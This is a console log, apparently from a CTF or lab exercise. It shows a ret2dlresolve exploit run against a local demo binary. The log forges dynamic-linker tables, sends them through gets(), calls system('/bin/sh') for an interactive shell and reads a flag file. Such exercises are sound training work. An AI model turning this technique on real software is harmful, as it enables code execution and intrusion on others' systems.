```
python3 pwn-ret2dlresolve.py BIN=./resolve
[*] '/demos/ret2dlresolve-demo/resolve'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loading gadgets for '/demos/ret2dlresolve-demo/resolve'
[*] 
    └─# readelf --sections ./resolve | egrep "Name|.rela.plt|.dynsym|.dynstr"
      [Nr] Name              Type             Address           Offset
      [ 6] .dynsym           DYNSYM           00000000004003c0  000003c0
      [ 7] .dynstr           STRTAB           0000000000400420  00000420
      [11] .rela.plt         RELA             00000000004004b8  000004b8
[*] Original SYMTAB = 0x4003c0
[*] Original STRTAB = 0x400420
[*] Original JMPREL = 0x4004b8
[+] Starting local process '/demos/ret2dlresolve-demo/resolve': pid 2198
[*] Sending chain to gets() at 0x404e00
[*] Writing Fake STRTAB at 0x404e00
[*] Writing Fake SYMTAB at 0x404e18
[*] Writing Fake JMPREL at 0x404e38
[*] Writing "/bin/sh"  at at 0x404e50
[*] Fake STRTAB, SYMTAB, JMPREL, ARGS Sent
[*] Setting RDI to Fake Args == /bin/sh
[*] Calling init_plt for fake index 0x310 for system()
[*] Switching to interactive mode
$ cat flag.txt
flag{i_sure_wished_this_worked_remotely_too}
```